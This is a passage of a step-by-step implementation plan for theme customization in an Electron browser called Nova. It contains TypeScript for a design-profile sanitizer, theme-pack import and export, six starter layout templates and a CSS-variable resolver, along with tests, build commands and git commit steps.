      if (typeof s.favorites === 'boolean') out.layout.sidebarSections.favorites = s.favorites;
      if (typeof s.pinned === 'boolean') out.layout.sidebarSections.pinned = s.pinned;
      if (typeof s.folders === 'boolean') out.layout.sidebarSections.folders = s.folders;
      if (typeof s.workspaces === 'boolean') out.layout.sidebarSections.workspaces = s.workspaces;
      if (typeof s.dockFooter === 'boolean') out.layout.sidebarSections.dockFooter = s.dockFooter;
    }
    if (Array.isArray(l.toolbarItems)) {
      const items = sanitizeToolbarItems(l.toolbarItems, []);
      if (items.length > 0) out.layout.toolbarItems = items;
    }
    if (typeof l.toolbarShowLabels === 'boolean') out.layout.toolbarShowLabels = l.toolbarShowLabels;
    if (typeof l.omniboxMaxWidth === 'string' && ['compact', 'balanced', 'full'].includes(l.omniboxMaxWidth)) {
      out.layout.omniboxMaxWidth = l.omniboxMaxWidth as BrowserDesignProfile['layout']['omniboxMaxWidth'];
    }
  }

  if (isPlainRecord(input.surfaces)) {
    const surfaces: Partial<Record<SurfaceZoneId, SurfaceZoneStyle>> = {};
    for (const zoneId of SURFACE_ZONE_IDS) {
      const z = sanitizeSurfaceZone(input.surfaces[zoneId]);
      if (z) surfaces[zoneId] = z;
    }
    if (Object.keys(surfaces).length > 0) out.surfaces = surfaces;
  }

  if (isPlainRecord(input.typography)) {
    const t = input.typography;
    out.typography = {};
    if (typeof t.fontFamily === 'string' && ['system', 'inter', 'geist', 'mono', 'serif', 'rounded'].includes(t.fontFamily)) {
      out.typography.fontFamily = t.fontFamily as UiFontFamily;
    }
    if (typeof t.uiScale === 'number') out.typography.uiScale = Number(clampNumber(t.uiScale, 0.85, 1.25, 1).toFixed(2));
    if (typeof t.iconScale === 'number') out.typography.iconScale = Number(clampNumber(t.iconScale, 0.85, 1.25, 1).toFixed(2));
  }

  if (typeof input.density === 'string' && ['compact', 'normal', 'comfortable'].includes(input.density)) {
    out.density = input.density as UiDensity;
  }

  if (isPlainRecord(input.effects)) {
    out.effects = {};
    if (input.effects.windowMaterial === 'glass-vibrancy' || input.effects.windowMaterial === 'opaque') {
      out.effects.windowMaterial = input.effects.windowMaterial as WindowMaterial;
    }
    if (typeof input.effects.reduceChromeMotion === 'boolean') {
      out.effects.reduceChromeMotion = input.effects.reduceChromeMotion;
    }
  }

  if (isPlainRecord(input.newTabLayout)) {
    const sanitizedNt = sanitizeNewTabLayout(input.newTabLayout, createDefaultDesignProfile().newTabLayout);
    out.newTabLayout = {};
    if (isPlainRecord(input.newTabLayout.clock)) out.newTabLayout.clock = sanitizedNt.clock;
    if (isPlainRecord(input.newTabLayout.greeting)) out.newTabLayout.greeting = sanitizedNt.greeting;
    if (isPlainRecord(input.newTabLayout.searchBox)) out.newTabLayout.searchBox = sanitizedNt.searchBox;
    if (isPlainRecord(input.newTabLayout.shortcuts)) out.newTabLayout.shortcuts = sanitizedNt.shortcuts;
    if (isPlainRecord(input.newTabLayout.tasksWidget)) out.newTabLayout.tasksWidget = sanitizedNt.tasksWidget;
  }

  if (isPlainRecord(input.customCss)) {
    out.customCss = {};
    if (typeof input.customCss.enabled === 'boolean') out.customCss.enabled = input.customCss.enabled;
    if (typeof input.customCss.css === 'string') out.customCss.css = sanitizeCustomCss(input.customCss.css).css;
  }

  return out;
}

export function exportThemePack(profile: BrowserDesignProfile): string {
  const safe = sanitizeDesignProfile(profile);
  const doc: ThemePackDocument = {
    format: 'nova-theme-pack',
    schemaVersion: 1,
    exportedAt: Date.now(),
    profile: safe,
  };
  return JSON.stringify(doc, null, 2);
}

export function importThemePack(
  rawJson: string
): { ok: true; profile: BrowserDesignProfile } | { ok: false; error: string } {
  if (typeof rawJson !== 'string' || !rawJson.trim()) {
    return { ok: false, error: 'Empty theme pack data.' };
  }
  if (rawJson.length > MAX_THEME_PACK_BYTES) {
    return { ok: false, error: 'Theme pack file exceeds 128 KB limit.' };
  }
  let parsed: unknown;
  try {
    parsed = JSON.parse(rawJson);
  } catch {
    return { ok: false, error: 'Invalid JSON syntax in theme pack.' };
  }
  if (!isPlainRecord(parsed) || parsed.format !== 'nova-theme-pack' || parsed.schemaVersion !== 1 || !isPlainRecord(parsed.profile)) {
    return { ok: false, error: 'Unsupported or malformed Nova theme pack header.' };
  }
  return { ok: true, profile: sanitizeDesignProfile(parsed.profile) };
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx esbuild tests/design_customization_security.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_sec.cjs && node dist-test/design_sec.cjs`  
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/utils/designSecurity.ts tests/design_customization_security.test.ts
git commit -m "feat(security): add theme pack and Custom CSS sanitizer"
```

---

### Task 3: Effective Design Resolver & Starter Templates

**Files:**
- Create: `src/utils/designEngine.ts`
- Create: `src/utils/designTemplates.ts`
- Test: `tests/design_engine.test.ts`

**Interfaces:**
- Consumes: `UserSettings`, `BrowserDesignProfile`, `SurfaceZoneId`, `SurfaceZoneStyle` (`src/types/browser.ts`), `sanitizeDesignProfile` (`src/utils/designSecurity.ts`), `SURFACE_ZONE_IDS`, `createDefaultDesignProfile` (`src/utils/designDefaults.ts`)
- Produces: `STARTER_DESIGN_TEMPLATES: StarterDesignTemplate[]`, `getStarterTemplateById(id)` (`src/utils/designTemplates.ts`); `resolveEffectiveDesign(settings, activeWorkspaceId?, isIncognito?)`, `designToCssVariables(resolved, isDark)` (`src/utils/designEngine.ts`).

- [ ] **Step 1: Write failing tests for workspace override priority, incognito surface guard, and zone CSS variable generation**

```ts
// tests/design_engine.test.ts
import assert from 'node:assert/strict';
import { defaultSettings, type UserSettings } from '../src/types/browser';
import { resolveEffectiveDesign, designToCssVariables } from '../src/utils/designEngine';
import { STARTER_DESIGN_TEMPLATES } from '../src/utils/designTemplates';

assert.ok(STARTER_DESIGN_TEMPLATES.length >= 6);

const base: UserSettings = {
  ...defaultSettings,
  workspaceDesigns: {
    work: {
      layout: {
        ...defaultSettings.designProfile!.layout,
        chromeMode: 'vertical-right',
        sidebarWidth: 310,
      },
      surfaces: {
        toolbar: { bg: '#112233', radius: 14, blur: 12 },
      },
    },
  },
};

const defaultResolved = resolveEffectiveDesign(base, 'default', false);
assert.equal(defaultResolved.layout.chromeMode, 'classic-top');

const workResolved = resolveEffectiveDesign(base, 'work', false);
assert.equal(workResolved.layout.chromeMode, 'vertical-right');
assert.equal(workResolved.layout.sidebarWidth, 310);
assert.equal(workResolved.surfaces.toolbar?.bg, '#112233');

const incognitoResolved = resolveEffectiveDesign(base, 'work', true);
assert.equal(incognitoResolved.layout.chromeMode, 'vertical-right');
assert.equal(incognitoResolved.isIncognitoLocked, true);

const vars = designToCssVariables(workResolved, true);
assert.equal(vars['--nova-toolbar-bg'], '#112233');
assert.equal(vars['--nova-toolbar-radius'], '14px');
assert.equal(vars['--nova-toolbar-blur'], '12px');
assert.equal(vars['--nova-sidebar-width'], '310px');
console.log('design_engine.test.ts passed');
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx esbuild tests/design_engine.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_engine.cjs && node dist-test/design_engine.cjs`  
Expected: FAIL (`Could not resolve "../src/utils/designEngine"`).

- [ ] **Step 3: Implement `src/utils/designTemplates.ts` and `src/utils/designEngine.ts`**

Create `src/utils/designTemplates.ts` with 6 distinct complete architectural starter profiles:
- `nova-default`: Balanced two-row default (`classic-top`)
- `zen-compact`: `compact-single-row`, compact density, 14px pill omnibox & tabs, Geist/Inter clean chrome
- `arc-studio`: `vertical-left`, `268px`, sage-free harmonious sidebar tint + spacious padding + rounded cards
- `right-dock-pro`: `vertical-right`, crisp mono font styling, subtle sharp radius (`6px`), compact toolbar & bottom New Tab tasks
- `frosted-glass`: `glass-vibrancy`, semi-transparent `0.68` surfaces, `20px` blur, soft glow shadows
- `minimal-paper`: `classic-top` with `tabBarPosition: 'below-toolbar'`, clean editorial serif clock, minimal New Tab search, square subtle borders

```ts
import type { BrowserDesignProfile } from '../types/browser';
import { createDefaultDesignProfile, TOOLBAR_ITEM_ORDER_DEFAULT } from './designDefaults';

export interface StarterDesignTemplate {
  id: string;
  name: string;
  description: string;
  previewAccent: string;
  previewBg: string;
  profile: BrowserDesignProfile;
}

const cloneBase = (): BrowserDesignProfile => createDefaultDesignProfile();

export const STARTER_DESIGN_TEMPLATES: StarterDesignTemplate[] = [
  {
    id: 'nova-default',
    name: 'Nova Default',
    description: 'Two-row top navigation with balanced floating tabs and clean toolbar.',
    previewAccent: '#3b82f6',
    previewBg: '#0f172a',
    profile: cloneBase(),
  },
  {
    id: 'zen-compact',
    name: 'Zen Single-Row',
    description: 'Ultra-compact single unified bar combining tabs, URL pill, and essential controls.',
    previewAccent: '#06b6d4',
    previewBg: '#090d16',
    profile: {
      ...cloneBase(),
      meta: { version: 1, name: 'Zen Single-Row', baseTemplateId: 'zen-compact' },
      layout: {
        ...cloneBase().layout,
        chromeMode: 'compact-single-row',
        omniboxMaxWidth: 'compact',
        toolbarItems: [
          { id: 'slot-back', kind: 'back', visible: true },
          { id: 'slot-forward', kind: 'forward', visible: true },
          { id: 'slot-reload', kind: 'reload', visible: true },
          { id: 'slot-omnibox', kind: 'omnibox', visible: true },
          { id: 'slot-ai', kind: 'ai', visible: true },
          { id: 'slot-customize', kind: 'customize', visible: true },
          { id: 'slot-menu', kind: 'menu', visible: true },
        ],
      },
      density: 'compact',
      surfaces: {
        omnibox: { radius: 999 },
        activeTab: { radius: 12 },
      },
    },
  },
  {
    id: 'arc-studio',
    name: 'Arc Sidebar Studio',
    description: 'Left spatial vertical sidebar with wide workspaces dock and soft rounded window frame.',
    previewAccent: '#8b5cf6',
    previewBg: '#161326',
    profile: {
      ...cloneBase(),
      meta: { version: 1, name: 'Arc Sidebar Studio', baseTemplateId: 'arc-studio' },
      layout: {
        ...cloneBase().layout,
        chromeMode: 'vertical-left',
        sidebarWidth: 268,
        toolbarItems: TOOLBAR_ITEM_ORDER_DEFAULT,
      },
      density: 'comfortable',
      surfaces: {
        sidebar: { radius: 12 },
        activeTab: { radius: 10, shadow: 'soft' },
      },
    },
  },
  {
    id: 'right-dock-pro',
    name: 'Right Engineer Dock',
    description: 'Right-aligned vertical tabs, monospaced UI chrome, crisp borders, and compact metrics.',
    previewAccent: '#10b981',
    previewBg: '#081512',
    profile: {
      ...cloneBase(),
      meta: { version: 1, name: 'Right Engineer Dock', baseTemplateId: 'right-dock-pro' },
      layout: {
        ...cloneBase().layout,
        chromeMode: 'vertical-right',
        sidebarWidth: 248,
      },
      typography: { fontFamily: 'mono', uiScale: 0.96, iconScale: 0.95 },
      density: 'compact',
      surfaces: {
        toolbar: { radius: 6, borderWidth: 1 },
        omnibox: { radius: 6 },
        activeTab: { radius: 6 },
        sidebar: { radius: 6 },
      },
      newTabLayout: {
        ...cloneBase().newTabLayout,
        clock: { visible: true, format: '24h', style: 'mono', align: 'left' },
        shortcuts: { visible: true, columns: 6, cardStyle: 'compact' },
      },
    },
  },
  {
    id: 'frosted-glass',
    name: 'Frosted Translucent Glass',
    description: 'Native OS window vibrancy paired with frosted backdrop blur across chrome surfaces.',
    previewAccent: '#ec4899',
    previewBg: '#1d1024',
    profile: {
      ...cloneBase(),
      meta: { version: 1, name: 'Frosted Translucent Glass', baseTemplateId: 'frosted-glass' },
      effects: { windowMaterial: 'glass-vibrancy', reduceChromeMotion: false },
      surfaces: {
        frame: { opacity: 0.72, blur: 24 },
        toolbar: { opacity: 0.78, blur: 20, radius: 12 },
        sidebar: { opacity: 0.72, blur: 24 },
        activeTab: { opacity: 0.88, blur: 16, radius: 12, shadow: 'glow' },
        popovers: { opacity: 0.85, blur: 28, radius: 16, shadow: 'elevated' },
      },
    },
  },
  {
    id: 'minimal-paper',
    name: 'Minimal Editorial',
    description: 'Tab strip tucked neatly below the address bar, serif New Tab typography, distraction-free chrome.',
    previewAccent: '#f59e0b',
    previewBg: '#1c1917',
    profile: {
      ...cloneBase(),
      meta: { version: 1, name: 'Minimal Editorial', baseTemplateId: 'minimal-paper' },
      layout: {
        ...cloneBase().layout,
        chromeMode: 'classic-top',
        tabBarPosition: 'below-toolbar',
        omniboxMaxWidth: 'compact',
      },
      typography: { fontFamily: 'serif', uiScale: 1, iconScale: 0.95 },
      newTabLayout: {
        clock: { visible: true, format: '24h', style: 'editorial', align: 'center' },
        greeting: { visible: false, customText: '' },
        searchBox: { visible: true, style: 'minimal', width: 'narrow' },
        shortcuts: { visible: true, columns: 5, cardStyle: 'pill' },
        tasksWidget: { visible: false, placement: 'bottom' },
      },
    },
  },
];

export function getStarterTemplateById(id: string): StarterDesignTemplate | undefined {
  return STARTER_DESIGN_TEMPLATES.find(t => t.id === id);
}
```

Create `src/utils/designEngine.ts`:
```ts
import type {
  BrowserDesignProfile,
  SurfaceZoneId,
  SurfaceZoneStyle,
  UiDensity,
  UiFontFamily,
  UserSettings,
} from '../types/browser';
import { SURFACE_ZONE_IDS, createDefaultDesignProfile } from './designDefaults';
import { sanitizeDesignProfile } from './designSecurity';

export interface ResolvedBrowserDesign extends BrowserDesignProfile {
  isIncognitoLocked: boolean;
  effectiveAccentHex: string;
}

const FONT_FAMILY_STACKS: Record<UiFontFamily, string> = {
  system: 'ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
  inter: '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
  geist: '"Geist", "Inter", -apple-system, BlinkMacSystemFont, sans-serif',
  mono: 'ui-monospace, "SF Mono", Menlo, Monaco, Consolas, monospace',
  serif: 'Georgia, "Iowan Old Style", "Times New Roman", Times, serif',
  rounded: 'ui-rounded, "SF Pro Rounded", "Nunito", -apple-system, sans-serif',
};

const DENSITY_METRICS: Record<UiDensity, { padY: string; padX: string; toolbarH: string; tabH: string }> = {
  compact: { padY: '3px', padX: '8px', toolbarH: '38px', tabH: '32px' },
  normal: { padY: '6px', padX: '12px', toolbarH: '44px', tabH: '38px' },
  comfortable: { padY: '9px', padX: '14px', toolbarH: '50px', tabH: '42px' },
};

const SHADOW_MAP: Record<NonNullable<SurfaceZoneStyle['shadow']>, string> = {
  none: 'none',
  soft: '0 2px 8px rgba(0, 0, 0, 0.12)',
  elevated: '0 10px 28px rgba(0, 0, 0, 0.24)',
  glow: '0 0 18px color-mix(in srgb, var(--nova-accent, #3b82f6) 28%, transparent)',
};

const ACCENT_MAP: Record<string, string> = {
  blue: '#3b82f6',
  emerald: '#10b981',
  purple: '#a855f7',
  rose: '#f43f5e',
  amber: '#f59e0b',
};

function mergeZoneMaps(
  base: Partial<Record<SurfaceZoneId, SurfaceZoneStyle>>,
  override?: Partial<Record<SurfaceZoneId, SurfaceZoneStyle>>
): Partial<Record<SurfaceZoneId, SurfaceZoneStyle>> {
  const merged: Partial<Record<SurfaceZoneId, SurfaceZoneStyle>> = {};
  for (const id of SURFACE_ZONE_IDS) {
    if (base[id] || override?.[id]) {
      merged[id] = { ...(base[id] || {}), ...(override?.[id] || {}) };
    }
  }
  return merged;
}

export function resolveEffectiveDesign(
  settings: UserSettings,
  activeWorkspaceId?: string,
  isIncognito = false
): ResolvedBrowserDesign {
  const baseProfile = sanitizeDesignProfile(settings.designProfile, createDefaultDesignProfile());

  // Sync legacy useVerticalTabs and showTasksWidget seamlessly when global overrides haven't specified them
  if (settings.useVerticalTabs && baseProfile.layout.chromeMode !== 'vertical-left' && baseProfile.layout.chromeMode !== 'vertical-right') {
    baseProfile.layout.chromeMode = 'vertical-left';
  }
  if (typeof settings.showTasksWidget === 'boolean' && settings.designProfile?.newTabLayout?.tasksWidget?.visible === undefined) {
    baseProfile.newTabLayout.tasksWidget.visible = settings.showTasksWidget;
  }

  let effective: BrowserDesignProfile = baseProfile;
  const wsOverride = activeWorkspaceId && settings.workspaceDesigns
    ? settings.workspaceDesigns[activeWorkspaceId]
    : undefined;

  if (wsOverride && typeof wsOverride === 'object') {
    effective = sanitizeDesignProfile({
      ...baseProfile,
      ...wsOverride,
      meta: { ...baseProfile.meta, ...(wsOverride.meta || {}) },
      layout: {
        ...baseProfile.layout,
        ...(wsOverride.layout || {}),
        sidebarSections: {
          ...baseProfile.layout.sidebarSections,
          ...(wsOverride.layout?.sidebarSections || {}),
        },
        toolbarItems: wsOverride.layout?.toolbarItems ?? baseProfile.layout.toolbarItems,
      },
      surfaces: mergeZoneMaps(baseProfile.surfaces, wsOverride.surfaces),
      typography: { ...baseProfile.typography, ...(wsOverride.typography || {}) },
      effects: { ...baseProfile.effects, ...(wsOverride.effects || {}) },
      newTabLayout: {
        clock: { ...baseProfile.newTabLayout.clock, ...(wsOverride.newTabLayout?.clock || {}) },
        greeting: { ...baseProfile.newTabLayout.greeting, ...(wsOverride.newTabLayout?.greeting || {}) },
        searchBox: { ...baseProfile.newTabLayout.searchBox, ...(wsOverride.newTabLayout?.searchBox || {}) },
        shortcuts: { ...baseProfile.newTabLayout.shortcuts, ...(wsOverride.newTabLayout?.shortcuts || {}) },
        tasksWidget: { ...baseProfile.newTabLayout.tasksWidget, ...(wsOverride.newTabLayout?.tasksWidget || {}) },
      },
      customCss: { ...baseProfile.customCss, ...(wsOverride.customCss || {}) },
    });
  }

  const effectiveAccentHex = settings.accentColor === 'custom' && settings.customAccentColor && /^#[0-9a-fA-F]{3,8}$/.test(settings.customAccentColor)
    ? settings.customAccentColor
    : ACCENT_MAP[settings.accentColor] || '#3b82f6';

  if (isIncognito) {
    effective = {
      ...effective,
      surfaces: {
        ...effective.surfaces,
        frame: { bg: '#090710', borderColor: 'rgba(148,163,184,0.16)', opacity: 1 },
        toolbar: { bg: '#110e1c', textColor: '#f1f5f9', borderColor: 'rgba(148,163,184,0.16)', opacity: 1 },
        sidebar: { bg: '#0c0a14', textColor: '#e2e8f0', borderColor: 'rgba(148,163,184,0.16)', opacity: 1 },
      },
    };
  }

  return {
    ...effective,
    isIncognitoLocked: isIncognito,
    effectiveAccentHex,
  };
}

export function designToCssVariables(
  design: ResolvedBrowserDesign,
  isDark: boolean,
  baseVars: Record<string, string> = {}
): Record<string, string> {
  const vars: Record<string, string> = {};
  const density = DENSITY_METRICS[design.density] || DENSITY_METRICS.normal;

  vars['--nova-font-ui'] = FONT_FAMILY_STACKS[design.typography.fontFamily] || FONT_FAMILY_STACKS.system;
  vars['--nova-ui-scale'] = String(design.typography.uiScale);
  vars['--nova-icon-scale'] = String(design.typography.iconScale);
  vars['--nova-density-pad-y'] = density.padY;
  vars['--nova-density-pad-x'] = density.padX;
  vars['--nova-toolbar-height'] = density.toolbarH;
  vars['--nova-tab-height'] = density.tabH;
  vars['--nova-sidebar-width'] = `${design.layout.sidebarWidth}px`;

  const fallbackBg: Record<SurfaceZoneId, string> = {
    frame: baseVars['--nova-frame-bg'] || (isDark ? '#020617' : '#f1f5f9'),
    tabBar: baseVars['--nova-header-bg'] || (isDark ? '#0f172a' : '#e2e8f0'),
    activeTab: baseVars['--nova-active-tab-bg'] || (isDark ? '#1e293b' : '#ffffff'),
    inactiveTab: 'transparent',
    toolbar: baseVars['--nova-toolbar-bg'] || (isDark ? '#1e293b' : '#ffffff'),
    omnibox: isDark ? 'rgba(15, 23, 42, 0.72)' : 'rgba(241, 245, 249, 0.92)',
    sidebar: baseVars['--nova-sidebar-bg'] || (isDark ? '#0f172a' : '#f1f5f9'),
    aiPanel: baseVars['--nova-card-bg'] || (isDark ? 'rgba(15, 23, 42, 0.96)' : 'rgba(255, 255, 255, 0.95)'),
    popovers: baseVars['--nova-card-bg'] || (isDark ? '#1e293b' : '#ffffff'),
  };

  for (const zone of SURFACE_ZONE_IDS) {
    const z = design.surfaces[zone];
    const baseBg = z?.bg && z.bg !== 'inherit' ? z.bg : fallbackBg[zone];
    const opacity = z?.opacity ?? 1;
    vars[`--nova-${zone}-bg`] = opacity < 1 && baseBg !== 'transparent'
      ? `color-mix(in srgb, ${baseBg} ${Math.round(opacity * 100)}%, transparent)`
      : baseBg;
    if (z?.textColor && z.textColor !== 'inherit') {
      vars[`--nova-${zone}-text`] = z.textColor;
    } else {
      vars[`--nova-${zone}-text`] = isDark ? '#f8fafc' : '#0f172a';
    }
    vars[`--nova-${zone}-muted`] = z?.mutedColor && z.mutedColor !== 'inherit'
      ? z.mutedColor
      : isDark ? '#94a3b8' : '#64748b';
    vars[`--nova-${zone}-border`] = z?.borderColor && z.borderColor !== 'inherit'
      ? z.borderColor
      : baseVars['--nova-border-subtle'] || (isDark ? 'rgba(255,255,255,0.08)' : '#e2e8f0');
    vars[`--nova-${zone}-border-width`] = `${z?.borderWidth ?? 1}px`;
    vars[`--nova-${zone}-blur`] = `${z?.blur ?? 0}px`;
    vars[`--nova-${zone}-radius`] = `${z?.radius ?? (zone === 'activeTab' || zone === 'inactiveTab' ? 10 : 12)}px`;
    vars[`--nova-${zone}-shadow`] = z?.shadow ? SHADOW_MAP[z.shadow] : 'none';
  }

  // Keep existing core tokens synchronized with per-zone overrides so legacy selectors inherit immediately
  vars['--nova-frame-bg'] = vars['--nova-frame-bg'];
  vars['--nova-header-bg'] = vars['--nova-tabBar-bg'];
  vars['--nova-toolbar-bg'] = vars['--nova-toolbar-bg'];
  vars['--nova-sidebar-bg'] = vars['--nova-sidebar-bg'];
  vars['--nova-active-tab-bg'] = vars['--nova-activeTab-bg'];
  vars['--nova-card-bg'] = vars['--nova-popovers-bg'];

  return vars;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx esbuild tests/design_engine.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_engine.cjs && node dist-test/design_engine.cjs`  
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/utils/designTemplates.ts src/utils/designEngine.ts tests/design_engine.test.ts
git commit -m "feat(customization): add starter design templates and effective token resolver"
```

---

### Task 4: Expand `useThemeLanguage.ts` & Unify `.nova-vertical-sidebar` in `src/index.css`

**Files:**
- Modify: `src/hooks/useThemeLanguage.ts:1-60, 455-572`
- Modify: `src/index.css:570-640`
- Modify: `src/App.tsx:270-305` (pass `activeWorkspaceId`, `activeTab?.isIncognito`, and optional live draft override into `useThemeLanguage`)
- Test: `tests/design_engine.test.ts` (verify sidebar variables map to `--nova-sidebar-*`)

**Interfaces:**
- Consumes: `resolveEffectiveDesign`, `designToCssVariables` (`src/utils/designEngine.ts`), `sanitizeCustomCss` (`src/utils/designSecurity.ts`), `getElectronAPI()` (`src/utils/electronBridge.ts`)
- Produces: `useThemeLanguage(settings: UserSettings, options?: { activeWorkspaceId?: string; isIncognito?: boolean; draftProfileOverride?: BrowserDesignProfile })`.

- [ ] **Step 1: Add CSS variable & Custom CSS element test assertion to `tests/design_engine.test.ts`**

Append to `tests/design_engine.test.ts`:
```ts
const sidebarDarkVars = designToCssVariables(workResolved, true);
assert.ok(sidebarDarkVars['--nova-sidebar-bg']);
assert.ok(sidebarDarkVars['--nova-sidebar-text']);
assert.ok(sidebarDarkVars['--nova-sidebar-border']);
assert.ok(sidebarDarkVars['--nova-font-ui']);
```

- [ ] **Step 2: Verify `useThemeLanguage` callers across `src/` so optional parameter signature breaks nothing**

Run: `rg -n "useThemeLanguage" src/`  
Update `useThemeLanguage.ts` signature cleanly to accept an optional 2nd options object `(settings, { activeWorkspaceId, isIncognito, draftProfileOverride } = {})`:
- Inside the theme `useEffect`, merge `draftProfileOverride` if provided (used when Customize Mode previews unsaved changes).
- Run `resolveEffectiveDesign` + `designToCssVariables(..., baseVars)` to append all 9 zone vars, typography, density, and sidebar tokens into `currentVars` and `#nova-accent-style`.
- Manage `<style id="nova-custom-user-style">` right after `#nova-accent-style`, setting `textContent = effectiveDesign.customCss.enabled ? sanitizeCustomCss(effectiveDesign.customCss.css).css : ''`.
- Call `getElectronAPI()?.setWindowMaterial?.(effectiveDesign.effects.windowMaterial)` when `effects.windowMaterial` changes.
- Add font scaling CSS rules in `#nova-accent-style` scoped to `#nova-browser-chrome, .nova-vertical-sidebar, .nova-chrome-surface { font-family: var(--nova-font-ui); }` without affecting webviews.

Update `src/index.css` L573-637:
```css
.nova-vertical-sidebar {
  --sidebar-ink: var(--nova-sidebar-text, #383936);
  --sidebar-muted: var(--nova-sidebar-muted, #65685f);
  --sidebar-hover: var(--nova-inactive-tab-hover-bg, #e6e7e1);
  --sidebar-selected: var(--nova-activeTab-bg, var(--nova-active-tab-bg, #fff));
  --sidebar-surface: var(--nova-sidebar-bg, #eeefe9);
  --sidebar-border: var(--nova-sidebar-border, #d9dbd3);
  color: var(--sidebar-ink);
  font-family: var(--nova-font-ui, inherit);
  font-size: calc(13px * var(--nova-ui-scale, 1));
  backdrop-filter: blur(var(--nova-sidebar-blur, 0px));
  -webkit-backdrop-filter: blur(var(--nova-sidebar-blur, 0px));
}
.dark .nova-vertical-sidebar {
  --sidebar-ink: var(--nova-sidebar-text, #e3e4df);
  --sidebar-muted: var(--nova-sidebar-muted, #95968e);
  --sidebar-hover: var(--nova-inactive-tab-hover-bg, #32342f);
  --sidebar-selected: var(--nova-activeTab-bg, var(--nova-active-tab-bg, #3c3e38));
  --sidebar-surface: var(--nova-sidebar-bg, #262823);
  --sidebar-border: var(--nova-sidebar-border, #3b3d36);
}
```
Also ensure `.nova-vertical-sidebar [role='tab']:focus-visible` uses `outline: 2px solid var(--nova-accent, #74876a);`.

- [ ] **Step 3: Run tests & typecheck**

Run: `npx esbuild tests/design_engine.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_engine.cjs && node dist-test/design_engine.cjs && npm run test:sidebar && npx tsc --noEmit`  
Expected: PASS and 0 TS errors.

- [ ] **Step 4: Commit**

```bash
git add src/hooks/useThemeLanguage.ts src/index.css src/App.tsx tests/design_engine.test.ts
git commit -m "feat(theme): emit per-zone CSS tokens and unify vertical sidebar theme"
```

---

### Task 5: Replace Hardcoded Chrome Accent/Surface Classes Across UI Components

**Files:**
- Modify: `src/components/TopBar.tsx` (active tab border/accent, AI/Account/More highlights, Bookmarks bar surfaces, popovers)
- Modify: `src/components/topbar/OmniboxBar.tsx` (omnibox bg, radius, blur, focus border via `--nova-omnibox-*` and `--nova-accent`)
- Modify: `src/components/SidebarTabs.tsx` (remove static olive/cyan overrides on sidebar controls/search box/hover icons -> `--nova-accent`, `--nova-omnibox-*`, `--nova-sidebar-border`)
- Modify: `src/components/SidePanel.tsx` (root panel background/border/blur/shadow -> `--nova-aiPanel-*`)

**Interfaces:**
- Consumes: CSS tokens `--nova-<zone>-bg`, `--nova-<zone>-text`, `--nova-<zone>-border`, `--nova-<zone>-blur`, `--nova-<zone>-radius`, `--nova-<zone>-shadow`, `--nova-accent` from `useThemeLanguage.ts`.

- [ ] **Step 1: Inspect exact lines to replace in each file via grep**

Run: `rg -n "text-cyan-|border-cyan-|bg-blue-|bg-cyan-|backdrop-blur-2xl" src/components/TopBar.tsx src/components/topbar/OmniboxBar.tsx src/components/SidebarTabs.tsx src/components/SidePanel.tsx`

- [ ] **Step 2: Migrate chrome containers and active accent controls to semantic CSS variables**

In `src/components/SidePanel.tsx` around line 828: apply `style={{ backgroundColor: 'var(--nova-aiPanel-bg)', borderColor: 'var(--nova-aiPanel-border)', borderLeftWidth: 'var(--nova-aiPanel-border-width, 1px)', backdropFilter: 'blur(var(--nova-aiPanel-blur, 24px))', boxShadow: 'var(--nova-aiPanel-shadow)', borderRadius: 'var(--nova-aiPanel-radius, 0px)', fontFamily: 'var(--nova-font-ui)' }}` with dark fallback preserved for incognito/initial paint.

In `src/components/topbar/OmniboxBar.tsx`: style main pill container with `backgroundColor: 'var(--nova-omnibox-bg)'`, `borderRadius: 'var(--nova-omnibox-radius, 12px)'`, `backdropFilter: 'blur(var(--nova-omnibox-blur, 0px))'`, `color: 'var(--nova-omnibox-text)'`, focus ring & active bookmarks/sparkle accents using `--nova-accent` / `var(--nova-accent-light)` instead of hardcoded cyan/blue.

In `src/components/TopBar.tsx` and `src/components/SidebarTabs.tsx`: map toolbar height (`minHeight: 'var(--nova-toolbar-height, 44px)'`), tab bar height (`height: 'var(--nova-tab-height, 38px)'`), tab corner radius (`--nova-activeTab-radius` / `--nova-inactiveTab-radius`), borders, and AI/shield/account badges to `--nova-accent` and zone vars.

- [ ] **Step 3: Verify existing sidebar UI & typecheck tests pass**

Run: `npm run test:sidebar && npx tsc --noEmit`  
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add src/components/TopBar.tsx src/components/topbar/OmniboxBar.tsx src/components/SidebarTabs.tsx src/components/SidePanel.tsx
git commit -m "refactor(ui): bind chrome components to semantic per-zone theme variables"
```

---

### Task 6: Electron Window Material IPC (`set-window-material`) & View Menu Accelerators

**Files:**
- Modify: `electron/main.ts:1170-1220, 4280-4300`
- Modify: `electron/preload.ts:4-12`
- Modify: `src/types/electron.d.ts` (or locate existing `window.electronAPI` interface declaration via `rg -n "setTheme" src/`)
- Test: `tests/main_process_runtime_verification.ts`

**Interfaces:**
- Consumes: `isTrustedSender`, `mainWindow`, `sendToMainWindow` in `electron/main.ts`
- Produces: Electron IPC `'set-window-material'`, preload methods `setWindowMaterial(material)`, `onToggleCustomizeMode(cb)`, `onResetAppearanceDefault(cb)`.

- [ ] **Step 1: Locate `window.electronAPI` TS declaration**

Run: `rg -n "setTheme:" src/ electron/`

- [ ] **Step 2: Add IPC handler & View menu items in `electron/main.ts` and expose in `electron/preload.ts`**

In `electron/main.ts` inside `View` submenu (around line 1210):
```ts
        { type: 'separator' as const },
        {
          label: 'Customize Browser...',
          accelerator: 'Shift+CmdOrCtrl+E',
          click: () => {
            sendToMainWindow('shortcut', 'toggle-customize-mode');
          }
        },
        {
          label: 'Reset Appearance to Default',
          accelerator: 'Shift+CmdOrCtrl+0',
